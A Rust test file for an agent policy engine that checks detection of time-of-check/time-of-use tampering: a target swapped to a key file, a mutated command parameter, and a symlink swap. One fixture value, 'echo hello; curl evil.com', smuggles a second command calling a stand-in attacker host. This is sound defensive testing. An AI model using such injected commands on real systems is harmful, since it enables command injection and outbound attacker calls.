//! Time-of-Check to Time-of-Use (TOCTOU) tamper detection tests.

use std::fs;
use tempfile::tempdir;
use valutx_policy_engine::{
    capabilities, verify_execution_integrity, ActionRequest, DecisionEffect, PolicyEngine,
    PolicyError, RiskClass, Role,
};

#[test]
fn test_toctou_target_mutation_detected() {
    let temp_dir = tempdir().expect("create temp dir");
    let safe_file = temp_dir.path().join("safe.txt");
    fs::write(&safe_file, "clean content").expect("write safe file");

    let engine = PolicyEngine::new();
    let req = ActionRequest {
        run_id: Some("toctou-run".to_string()),
        actor_id: "agent_worker".to_string(),
        role: Role::Developer,
        capability: capabilities::PROJECT_WRITE.to_string(),
        target: safe_file.to_string_lossy().to_string(),
        parameters: serde_json::json!({ "mode": "append" }),
        scope: None,
        environment: "local".to_string(),
        trust_state: "trusted".to_string(),
        approval: None,
    };

    // 1. Time of Check: Policy decision generated
    let decision = engine.evaluate_action(&req).expect("evaluate safe file");
    assert_eq!(decision.effect, DecisionEffect::Allow);

    // 2. Time of Use: Target changed to sensitive system file
    let sensitive_file = temp_dir.path().join("sensitive_keys.pem");
    fs::write(&sensitive_file, "private key").expect("write sensitive file");

    let tampered_result = verify_execution_integrity(
        &decision,
        &sensitive_file.to_string_lossy(),
        &req.parameters,
        &req.capability,
        &req.actor_id,
        RiskClass::L1,
        None,
    );

    assert!(
        tampered_result.is_err(),
        "Target mutation MUST trigger TOCTOU error"
    );
    match tampered_result.unwrap_err() {
        PolicyError::ToctouDetected {
            original_hash,
            current_hash,
            path,
        } => {
            assert_eq!(original_hash, decision.action_hash);
            assert_ne!(current_hash, original_hash);
            assert!(path.contains("sensitive_keys.pem"));
        }
        other => panic!("Expected ToctouDetected, got {:?}", other),
    }
}

#[test]
fn test_toctou_parameter_mutation_detected() {
    let temp_dir = tempdir().expect("create temp dir");
    let safe_file = temp_dir.path().join("script.sh");
    fs::write(&safe_file, "echo hello").expect("write safe file");

    let engine = PolicyEngine::new();
    let initial_params = serde_json::json!({ "command": "echo hello", "timeout": 10 });

    let req = ActionRequest {
        run_id: Some("toctou-args-run".to_string()),
        actor_id: "agent_worker".to_string(),
        role: Role::Developer,
        capability: capabilities::TERMINAL_EXECUTE.to_string(),
        target: safe_file.to_string_lossy().to_string(),
        parameters: initial_params.clone(),
        scope: None,
        environment: "sandbox".to_string(),
        trust_state: "trusted".to_string(),
        approval: None,
    };

    let decision = engine.evaluate_action(&req).expect("evaluate initial args");
    assert_eq!(decision.effect, DecisionEffect::Allow);

    // Tamper with command argument right before execution
    let tampered_params =
        serde_json::json!({ "command": "echo hello; curl evil.com", "timeout": 10 });

    let tampered_result = verify_execution_integrity(
        &decision,
        &safe_file.to_string_lossy(),
        &tampered_params,
        &req.capability,
        &req.actor_id,
        RiskClass::L2,
        None,
    );

    assert!(
        tampered_result.is_err(),
        "Argument mutation MUST trigger TOCTOU error"
    );
    match tampered_result.unwrap_err() {
        PolicyError::ToctouDetected {
            original_hash,
            current_hash,
            ..
        } => {
            assert_ne!(current_hash, original_hash);
        }
        other => panic!("Expected ToctouDetected, got {:?}", other),
    }
}

#[test]
fn test_toctou_symlink_swap_detected() {
    let temp_dir = tempdir().expect("create temp dir");
    let safe_target = temp_dir.path().join("safe_target.txt");
    let sensitive_target = temp_dir.path().join("sensitive_target.txt");
    let link_path = temp_dir.path().join("symlink_pointer.txt");

    fs::write(&safe_target, "benign").unwrap();
    fs::write(&sensitive_target, "confidential").unwrap();

    // Try creating a symlink
    #[cfg(unix)]
    let symlink_created = std::os::unix::fs::symlink(&safe_target, &link_path).is_ok();
    #[cfg(windows)]
    let symlink_created = std::os::windows::fs::symlink_file(&safe_target, &link_path).is_ok();

    if !symlink_created {
        // If unprivileged symlink creation is restricted on host OS, test passes trivially
        eprintln!("Symlink creation unprivileged on host OS, skipping physical symlink swap test");
        return;
    }

    let engine = PolicyEngine::new();
    let req = ActionRequest {
        run_id: Some("toctou-symlink-run".to_string()),
        actor_id: "agent_worker".to_string(),
        role: Role::Developer,
        capability: capabilities::PROJECT_WRITE.to_string(),
        target: link_path.to_string_lossy().to_string(),
        parameters: serde_json::json!({}),
        scope: None,
        environment: "local".to_string(),
        trust_state: "trusted".to_string(),
        approval: None,
    };

    let decision = engine.evaluate_action(&req).expect("evaluate link to safe");

    // Swap symlink to point to sensitive_target
    fs::remove_file(&link_path).unwrap();
    #[cfg(unix)]
    std::os::unix::fs::symlink(&sensitive_target, &link_path).unwrap();
    #[cfg(windows)]
    std::os::windows::fs::symlink_file(&sensitive_target, &link_path).unwrap();

    let check_result = verify_execution_integrity(
        &decision,
        &link_path.to_string_lossy(),
        &req.parameters,
        &req.capability,
        &req.actor_id,
        RiskClass::L1,
        None,
    );

    assert!(
        check_result.is_err(),
        "Symlink swap MUST be detected by TOCTOU verifier"
    );
    match check_result.unwrap_err() {
        PolicyError::ToctouDetected {
            original_hash,
            current_hash,
            ..
        } => {
            assert_ne!(current_hash, original_hash);
        }
        other => panic!("Expected ToctouDetected, got {:?}", other),
    }
}
